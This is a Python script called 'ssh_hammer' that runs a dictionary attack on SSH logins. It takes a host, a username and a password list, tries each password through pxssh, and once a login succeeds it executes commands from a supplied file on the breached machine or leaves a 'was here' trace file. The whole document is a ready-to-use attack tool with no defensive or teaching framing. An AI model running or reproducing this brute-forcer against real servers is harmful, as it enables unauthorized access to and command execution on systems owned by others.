#/usr/bin/env py3

import optparse
import os
from pexpect import pxssh
import multiprocessing as mltp
from output_functions import *
from time import sleep

cmdFile = None

####################################
#                                  #
#         PREPROCESS               #
#                                  #
####################################

def main():
    printHello()
    host, user, passwdFile = checkOption()
    if (validArg(host, user, passwdFile) == True):
        startHammering(host, user, passwdFile)

def checkOption():
    global cmdFile

    parser = optparse.OptionParser(col.BOLD + 'Usage: ' +
    col.ENDC + 'py3 ssh_hammer --host <HOST> --user \
<USERNAME> -f <passwdDictionnary> --cmds <fileWithCmds>');
    parser.add_option('--host', dest='host', type='string')
    parser.add_option('--user', dest='user', type='string')
    parser.add_option('-f', dest='passwdFile', type='string')
    parser.add_option('--cmds', dest='cmdFile', type='string')
    (options, arg) = parser.parse_args()
    host = options.host
    user = options.user
    passwdFile = options.passwdFile
    cmdFile = options.cmdFile
    if (passwdFile != None and isValidFile(passwdFile) == False) or \
       (cmdFile != None and isValidFile(cmdFile) == False):
        return None, None, None
    if (validArg(host, user, passwdFile) == False):
        print (parser.usage)
        return None, None, None
    return host, user, passwdFile


def validArg(host, user, passwdFile):
    if (host == None or user == None or passwdFile == None):
        return False
    return True


def isValidFile(f):
    if not os.path.isfile(f):
        fileDoNotExist(f)
        return False
    elif not  os.access(f, os.R_OK):
        wrongPermOnFile(f)
        return False
    return True


####################################
#                                  #
#         HAMMER JOB               #
#                                  #
####################################

def startHammering(host, user, passwdFile):
    done = mltp.Queue()
    done.put((0, False))

    f = open(passwdFile)

    serv = None
    done.put((1, serv))
    infos = []
    infos.append(host)
    infos.append(user)
    for passwd in f.readlines():
        passwd = passwd.replace('\n', '')
        if (len(infos) > 2):
            infos.pop()
        infos.append(passwd)
        mem = done.get()[1]
        if (mem == True):
            exit(0)
        else:
            done.put((0, mem))
        processes = [ mltp.Process(target=connectHost, \
                                  args=(infos, done,)) ]
        processes[0].start()
        sleep(0.8)

    for endProcess in processes:
        endProcess.join()


def connectHost(infos, done):
    try:
        serv = pxssh.pxssh()
        serv.login(infos[0], infos[1], infos[2])
        done.put((0, True))
        printSuccess(infos[2], infos[1])
        startSendCmd(serv)
    except:
        printConnectFail(infos[1], infos[2])


def startSendCmd(serv):
    global cmdFile

    if (cmdFile == None):
        sendCmd(serv, 'echo "' + os.getlogin() +
                ' was here" >> .trace')
    else:
        f = open(cmdFile)
        for l in f.readlines():
            sendCmd(serv, l.replace('\n', ''))


def sendCmd(serv, cmd):
    serv.sendline(cmd)
    serv.prompt()
    print (serv.before)


if __name__ in '__main__':
    main()
